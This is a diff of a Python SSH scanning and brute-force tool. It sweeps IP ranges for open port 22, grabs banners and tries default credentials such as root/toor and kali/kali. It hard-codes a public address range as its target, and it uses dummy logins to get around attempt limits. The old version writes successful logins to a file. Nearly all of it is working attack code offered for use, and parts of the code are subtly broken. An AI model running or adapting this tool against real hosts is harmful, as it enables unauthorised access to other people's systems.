@@ -1,65 +1,109 @@
-import ipaddress
-import socket
-import paramiko
 import threading
-from colorama import Fore, Style
+import socket
+import ipaddress
+import paramiko
+from paramiko.ssh_exception import SSHException
 
-# Ask for user input of IP range
-ip_range = input("Enter IP range (e.g 127.0.0.0/24, 127.0.0.0-127.0.0.255, 127.0.0.0): ")
+def create_ip_ranges(ip_range_input):
+    if '-' in ip_range_input:
+        start_ip, end_ip = ip_range_input.split('-')
+        return list(ipaddress.summarize_address_range(ipaddress.IPv4Address(start_ip.strip()), ipaddress.IPv4Address(end_ip.strip())))
+    elif '/' in ip_range_input:
+        return list(ipaddress.ip_network(ip_range_input).subnets())
+    else:
+        return [ipaddress.ip_network(ip_range_input)]
 
-# Convert IP range to a list of IP addresses
-ip_list = []
-if "/" in ip_range:
-    for ip in ipaddress.IPv4Network(ip_range, strict=False):
-        ip_list.append(str(ip))
-elif "-" in ip_range:
-    ip_range_split = ip_range.split("-")
-    ip_start = ipaddress.IPv4Address(ip_range_split[0])
-    ip_end = ipaddress.IPv4Address(ip_range_split[1])
-    for ip_int in range(int(ip_start), int(ip_end)):
-        ip_list.append(str(ipaddress.IPv4Address(ip_int)))
-else:
-    ip_list.append(ip_range)
+def scan_ips(ip_ranges_input):
+    ip_ranges = create_ip_ranges(ip_ranges_input)
 
-# Define list of usernames and passwords to try
-usernames = ["root", "admin", "ubuntu", "kali"]
-passwords = ["toor", "123456", "qwerty", "kali", "admin", "debian"]
+    ip_data = {}
+    for ip_range in ip_ranges:
+        for ip in ip_range:
+            ip_data[str(ip)] = {"port_22_open": False}
+            scan_thread = threading.Thread(target=scan_port, args=(str(ip), 22, ip_data))
+            scan_thread.start()
 
-# Function to scan IP address for open port 22
-def scan_ip(ip):
+    return ip_data
+
+def scan_port(ip, port, ip_data):
+    print(f"Scanning IP: {ip}")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(1)
+    result = s.connect_ex((ip, port))
+
+    if result == 0:
+        print(f"{ip} - Port {port} is open.")
+        ip_data[ip]["port_22_open"] = True
+
+def grab_banner_data(ip_data):
+    banners = {}
+    for ip, data in ip_data.items():
+        if data["port_22_open"]:
+            banner = get_banner(ip)
+            if banner:
+                banners[ip] = {"banner": banner}
+
+    return banners
+
+def get_banner(ip):
     try:
-        # Check if port 22 is open
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(1)
+        s.settimeout(5)
         s.connect((ip, 22))
-        s.close()
-        
-        # Attempt to log in using usernames and passwords
-        for username in usernames:
-            for password in passwords[:3]:
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                try:
-                    ssh.connect(ip, port=22, username=username, password=password)
-                    print(f"{Style.BRIGHT}{Fore.GREEN}[SUCCESS] IP: {ip} Username: {username} Password: {password}{Style.RESET_ALL}")
-                    with open("logins.txt", "a") as f:
-                        f.write(f"{ip} {username} {password}\n")
-                    ssh.close()
-                    return
-                except paramiko.AuthenticationException:
-                    print(f"{Fore.RED}[FAIL] IP: {ip} Username: {username} Password: {password}{Style.RESET_ALL}")
-                    ssh.close()
-                except Exception as e:
-                    ssh.close()
-                    print(f"{Fore.YELLOW}[ERROR] Exception: {e}{Style.RESET_ALL}")
+        banner = s.recv(1024).decode('utf-8').strip()
+        return banner
     except Exception as e:
-        print(f"{Fore.YELLOW}[ERROR] Exception: {e}{Style.RESET_ALL}")
+        print(f"Exception occurred while getting banner for {ip}: {e}")
+        return None
 
-# Scan IP ranges for open port 22
-threads = []
-for ip in ip_list:
-    t = threading.Thread(target=scan_ip, args=(ip,))
-    threads.append(t)
-    t.start()
-for thread in threads:
-    thread.join()
+def ssh_login_attempt(ip, username, password):
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(ip, username=username, password=password, timeout=5, banner_timeout=5, allow_agent=False, look_for_keys=False)
+        return True
+    except SSHException as e:
+        print(f"SSHException occurred at {ip}: {e}")
+        return False
+    except paramiko.ssh_exception.EOFError as e:
+        # Additional handling for the EOFError
+        print(f"EOFError occurred at {ip}: {e}")
+        return False
+    except:
+        return False
+
+def attempt_ssh_logins(ips_and_banners):
+    usernames = ["kali", "admin", "root", "ubuntu"]
+    passwords = ["kali", "admin", "toor", "123456", "qwerty", "debian"]
+
+    for ip, banner_data in ips_and_banners.items():
+        success = False
+        for username in usernames:
+            if success:
+                break
+            for i in range(6):
+                password = passwords[i]
+                if ssh_login_attempt(ip, username, password):
+                    print(f"Successful login: {ip} - {username} - {password}")
+                    success = True
+                    break
+                if i == 2:
+                    print(f"[{ip}] Disconnecting and reconnecting to try the other 3 passwords.")
+                    reconnect_attempts = 0
+                    while reconnect_attempts < 3:
+                        if ssh_login_attempt(ip, 'invalid_user', 'invalid_pass'):
+                            break
+                        reconnect_attempts += 1
+
+        if not success:
+            print(f"Failed to log in to {ip}")
+
+def main():
+    # change the input_ip_ranges to a valid input range
+    input_ip_ranges = "72.23.1.1-72.23.10.255"
+    ip_data = scan_ips(input_ip_ranges)
+    ips_and_banners = grab_banner_data(ip_data)
+    attempt_ssh_logins(ips_and_banners)
+
+if __name__ == "__main__":
+    main()
